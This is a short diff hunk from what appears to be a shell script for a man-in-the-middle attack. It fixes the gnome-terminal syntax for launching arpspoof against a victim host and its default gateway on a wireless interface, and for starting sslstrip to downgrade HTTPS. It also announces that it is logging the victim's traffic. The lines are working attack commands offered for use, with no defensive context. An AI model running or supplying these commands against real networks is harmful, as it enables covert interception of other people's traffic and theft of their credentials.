@@ -379,12 +379,13 @@ echo ".."
 sleep 5
 echo "..."
 sleep 5
-gnome-terminal -e arpspoof -i wlan0 -t $VICTIM -r $DG
+gnome-terminal -- "arpspoof -i wlan0 -t $VICTIM -r $DG"
 echo "Start sslstrip -l $REDIRECT on another terminal..."
 sleep 5
-gnome-terminal -e sslstrip -l $REDIRECT
+gnome-terminal -- "sslstrip -l $REDIRECT"
 sleep 5
 echo "Starting log your VICTIM $VICTIM trafics"
+
 
 
 
